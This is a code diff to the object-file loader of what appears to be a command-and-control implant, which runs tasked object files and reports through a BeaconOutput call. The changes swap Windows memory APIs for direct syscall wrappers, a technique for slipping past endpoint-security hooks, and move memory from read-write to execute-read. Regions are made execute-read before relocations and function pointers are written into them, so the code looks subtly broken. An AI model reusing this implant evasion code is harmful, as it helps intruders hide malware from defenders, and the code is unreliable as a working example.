@@ -2,6 +2,7 @@
 #include "ProcLoader.h"
 #include "utils.h"
 #include "Boffer.h"
+#include "Syscalls.h"
 
 #define llabs(n) ((n) < 0 ? -(n) : (n))
 
@@ -157,7 +158,7 @@ bool AllocateSections(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* mapSe
 {
 	for (int i = 0; i < pHeader->NumberOfSections; i++) {
 		COF_SECTION* pSection = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + (sizeof(COF_SECTION) * i));
-		mapSections[i] = (char*)ApiWin->VirtualAlloc(NULL, pSection->SizeOfRawData, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
+		mapSections[i] = (char*)ApiWin->VirtualAlloc(NULL, pSection->SizeOfRawData, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE);
 		if (!mapSections[i] && pSection->SizeOfRawData)
 			return FALSE;
 		
@@ -166,6 +167,15 @@ bool AllocateSections(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* mapSe
 		else 
 			memset(mapSections[i], 0, pSection->SizeOfRawData);
 	}
+	for (int i = 0; i < pHeader->NumberOfSections; i++) {
+		COF_SECTION* pSec = (COF_SECTION*)(coffFile + sizeof(COF_HEADER) + (sizeof(COF_SECTION) * i));
+		if (mapSections[i] && pSec->SizeOfRawData) {
+			PVOID pBase = mapSections[i];
+			SIZE_T sz = pSec->SizeOfRawData;
+			ULONG oldProt;
+			NtProtectVirtualMemory_SYSCALL(NtCurrentProcess(), &pBase, &sz, PAGE_EXECUTE_READ, &oldProt);
+		}
+	}
 	return TRUE;
 }
 
@@ -173,7 +183,8 @@ void CleanupSections(PCHAR* mapSections, int maxSections)
 {
 	for (int i = 0; i < maxSections; i++) {
 		if (mapSections[i]) {
-			ApiWin->VirtualFree(mapSections[i], 0, MEM_RELEASE);
+			SIZE_T sz = 0;
+			NtFreeVirtualMemory_SYSCALL(NtCurrentProcess(), (PVOID*)&mapSections[i], &sz, MEM_RELEASE);
 			mapSections[i] = NULL;
 		}
 	}
@@ -334,7 +345,15 @@ Packer* ObjectExecute(ULONG taskId, char* targetFuncName, unsigned char* coffFil
 		goto RET;
 	}
 
-	mapFunctions = (LPVOID*) ApiWin->VirtualAlloc(NULL, MAP_FUNCTIONS_SIZE, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
+	SIZE_T szMf = MAP_FUNCTIONS_SIZE;
+	mapFunctions = NULL;
+	NtAllocateVirtualMemory_SYSCALL(NtCurrentProcess(), (PVOID*)&mapFunctions, 0, &szMf, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (mapFunctions) {
+		PVOID pBase = mapFunctions;
+		SIZE_T sz = MAP_FUNCTIONS_SIZE;
+		ULONG oldProt;
+		NtProtectVirtualMemory_SYSCALL(NtCurrentProcess(), &pBase, &sz, PAGE_EXECUTE_READ, &oldProt);
+	}
 	if (!mapFunctions) {
 		BeaconOutput(BOF_ERROR_ALLOC, NULL, 0);
 		goto RET;
@@ -350,7 +369,8 @@ Packer* ObjectExecute(ULONG taskId, char* targetFuncName, unsigned char* coffFil
 
 RET:
 	if (mapFunctions) {
-		ApiWin->VirtualFree(mapFunctions, 0, MEM_RELEASE);
+		SIZE_T sz = 0;
+		NtFreeVirtualMemory_SYSCALL(NtCurrentProcess(), (PVOID*)&mapFunctions, &sz, MEM_RELEASE);
 		mapFunctions = NULL;
 	}
 
